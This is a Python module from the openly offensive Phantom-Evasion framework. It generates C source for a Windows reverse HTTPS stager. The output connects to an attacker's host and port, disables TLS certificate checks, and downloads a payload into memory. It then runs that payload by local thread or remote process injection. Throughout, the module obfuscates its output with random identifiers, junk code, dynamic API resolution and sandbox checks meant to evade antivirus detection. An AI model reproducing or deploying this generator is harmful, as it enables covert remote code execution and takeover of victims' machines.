
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
sys.path.append("Modules/payloads/auxiliar")

import inject_utils
from usefull import varname_creator
from usefull import JunkInjector
from usefull import WindowsDefend
from usefull import UriGenerator
#from usefull import WindowsDecoyProc
#from usefull import CloseDecoyProc
from usefull import CheckForBackslash
from usefull import Remote_methods
from usefull import IncludeShuffler
from usefull import WriteSource


def RevHttpsStager_C_windows(ModOpt):

    MemAlloc = ModOpt["MemAlloc"]
    ExecMethod = ModOpt["ExecMethod"]

    ModOpt["Lhost"] = CheckForBackslash(ModOpt["Lhost"])

    Randlpv = varname_creator()
    Randlpv2 = varname_creator()
    Randpointer = varname_creator()
    RandhInternet = varname_creator()
    RandhConnect = varname_creator()
    RandhRequest = varname_creator()
    RandwFlags = varname_creator()
    RandISOResult = varname_creator() 
    RandisSend = varname_creator()
    RandwByteRead = varname_creator()
    RandisRead = varname_creator()
    SumValueFunc = varname_creator()
    RandCharArray = varname_creator()
    RandCharset = varname_creator()
    RandInteger = varname_creator()
    RandRecv_int = varname_creator()
    ChecksumFunction = varname_creator()
    RandCharPtr2 = varname_creator()
    RandFuncFlag1 = varname_creator()
    RandFuncFlag2 = varname_creator()

    Arch = ModOpt["Arch"]
    MemAlloc = ModOpt["MemAlloc"]
    ExecMethod = ModOpt["ExecMethod"]

    if ModOpt["MemAlloc"] in ["SharedSection","SS"]:

        ModOpt["Buff"] = Randlpv
        ModOpt["Lpvoid"] = varname_creator()
    else:
        ModOpt["Buff"] = Randlpv
        ModOpt["Lpvoid"] = Randlpv
        
    ModOpt["Decoder"] = "False"

    ModOpt["Bufflen"] = "8000000"

    Ret_code = ""

    IncludeList = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

    Ret_code += IncludeShuffler(IncludeList) + "#include <tlhelp32.h>\n"

    Ret_code += "#include <wininet.h>\n"


    if ModOpt["Outformat"] == "exe":

        Ret_code += "int main(int argc,char * argv[]){\n"

    elif ModOpt["Outformat"] == "dll":

        if ModOpt["Reflective"] == True:

            Ret_code += "#include \"ReflectiveLoader.h\"\n"
        
        Ret_code += "BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpReserved){\n"
        Ret_code += "BOOL bReturnValue = TRUE;\n"
        Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"


    Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += WindowsDecoyProc(ModOpt["DecoyProc"])

    Ret_code += "$:EVA\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()
        Wininet = varname_creator()
        NdcInternetOpenA = varname_creator()
        NdcInternetConnectA = varname_creator()
        NdcHttpOpenRequestA = varname_creator()
        NdcInternetSetOption = varname_creator()
        NdcHttpSendRequestA = varname_creator()
        NdcInternetReadFile = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
        Ret_code += "HANDLE " + Wininet + " = GetModuleHandle(\"wininet.dll\");\n"
        Ret_code += "FARPROC " + NdcInternetOpenA + " = GetProcAddress(" + Wininet + ", \"InternetOpenA\");\n"
        Ret_code += "HINTERNET " + RandhInternet + " = (HINTERNET)" + NdcInternetOpenA + "(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        Ret_code += "if (" + RandhInternet + " != NULL){\n"

        Ret_code += "FARPROC " + NdcInternetConnectA + " = GetProcAddress(" + Wininet + ", \"InternetConnectA\");\n"
        Ret_code += "HINTERNET " + RandhConnect + " = (HINTERNET)" + NdcInternetConnectA + "(" + RandhInternet + ", \"" + ModOpt["Lhost"] + "\"," + ModOpt["Lport"] + ", NULL,NULL, INTERNET_SERVICE_HTTP,INTERNET_FLAG_SECURE,1);\n"
        Ret_code += "if (" + RandhConnect + " != NULL){\n"
        Ret_code += "FARPROC " + NdcHttpOpenRequestA + " = GetProcAddress(" + Wininet + ", \"HttpOpenRequestA\");\n"
        Ret_code += "HINTERNET " + RandhRequest + " = (HINTERNET)" + NdcHttpOpenRequestA + "(" + RandhConnect + ",NULL,\"" + UriGenerator() + "\",NULL, NULL, 0, 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000,1);\n"
        Ret_code += "if (" + RandhRequest + "!= NULL){\n"
        Ret_code += "DWORD " + RandwFlags + " = 0x00002000 | 0x00001000 | 0x00000200 | 0x00000100 | 0x00000080;\n"

        Ret_code += "FARPROC " + NdcInternetSetOption + " = GetProcAddress(" + Wininet + ", \"InternetSetOption\");\n"

        Ret_code += "BOOL " + RandISOResult + " = " + NdcInternetSetOption + "(" + RandhRequest + ",INTERNET_OPTION_SECURITY_FLAGS, &" + RandwFlags + ", sizeof (" + RandwFlags + ") );\n"
        Ret_code += "LPVOID " + Randlpv + ";\n"

        Ret_code += inject_utils.Win_MemLocal(ModOpt)

        Ret_code += "char * " + Randpointer + " = " + Randlpv + ";\n"

        Ret_code += "FARPROC " + NdcHttpSendRequestA + " = GetProcAddress(" + Wininet + ", \"HttpSendRequestA\");\n"
        Ret_code += "BOOL " + RandisSend + " = " + NdcHttpSendRequestA + "(" + RandhRequest + ", NULL, 0, NULL, 0);\n"
        Ret_code +=  "if (" + RandisSend + "){\n"
        Ret_code += "FARPROC " + NdcInternetReadFile + " = GetProcAddress(" + Wininet + ", \"InternetReadFile\");\n"
        Ret_code += "DWORD " + RandwByteRead + ";\n"
        Ret_code += "do{\n"
        Ret_code += "BOOL " + RandisRead + " = " + NdcInternetReadFile + "(" + RandhRequest + "," + Randpointer + ", 1024, &" + RandwByteRead + ");\n"

    else:

        Ret_code += "HINTERNET " + RandhInternet + " = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        Ret_code += "if (" + RandhInternet + " != NULL){\n"
        Ret_code += "HINTERNET " + RandhConnect + " = InternetConnectA(" + RandhInternet + ",\"" + ModOpt["Lhost"] + "\"," + ModOpt["Lport"] + ", NULL,NULL, INTERNET_SERVICE_HTTP,INTERNET_FLAG_SECURE,1);\n"
        Ret_code += "if (" + RandhConnect + " != NULL){\n"
        Ret_code += "HINTERNET " + RandhRequest + " = HttpOpenRequestA(" + RandhConnect + ",NULL,\"" + UriGenerator() + "\",NULL, NULL, 0, 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000,1);\n"
        Ret_code += "if (" + RandhRequest + "!= NULL){\n"
        Ret_code += "DWORD " + RandwFlags + " = 0x00002000 | 0x00001000 | 0x00000200 | 0x00000100 | 0x00000080;\n"
        Ret_code += "BOOL " + RandISOResult + " = InternetSetOption (" + RandhRequest + ",INTERNET_OPTION_SECURITY_FLAGS, &" + RandwFlags + ", sizeof (" + RandwFlags + ") );\n"
        Ret_code += "LPVOID " + Randlpv + ";\n"

        Ret_code += inject_utils.Win_MemLocal(ModOpt)
        Ret_code += "char * " + Randpointer + " = " + Randlpv + ";\n"
        Ret_code += "BOOL " + RandisSend + " = HttpSendRequestA(" + RandhRequest + ", NULL, 0, NULL, 0);\n"
        Ret_code +=  "if (" + RandisSend + "){\n"
        Ret_code += "DWORD " + RandwByteRead + ";\n"
        Ret_code += "do{\n"
        Ret_code += "BOOL " + RandisRead + " = InternetReadFile(" + RandhRequest + "," + Randpointer + ",8192, &" + RandwByteRead + ");\n"
    

    Ret_code += Randpointer + " += " + RandwByteRead + ";\n"
    Ret_code += "}while(" + RandwByteRead + " > 0);\n"

    if "RW/" in MemAlloc and ExecMethod == "Thread":

        Ret_code += inject_utils.Win_ChangeMemProtect(ModOpt)

    if  ModOpt["ExecMethod"] == "Thread":

        Ret_code += inject_utils.Win_LocalThread(ModOpt)
    else:    
        Ret_code += inject_utils.Win_RemoteInjection(ModOpt)

    Ret_code += "}}}}\n"

    Ret_code += "$:END\n"

    #Ret_code += CloseDecoyProc(ModOpt["DecoyProc"])

    Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],ModOpt["EF"],ModOpt["JR"])

    if ModOpt["Outformat"] == "exe":

        Ret_code += "return 0;}"

    elif ModOpt["Outformat"] == "dll":

        Ret_code += "}\n"
        Ret_code += "return bReturnValue;}\n"

    WriteSource("Source.c",Ret_code)

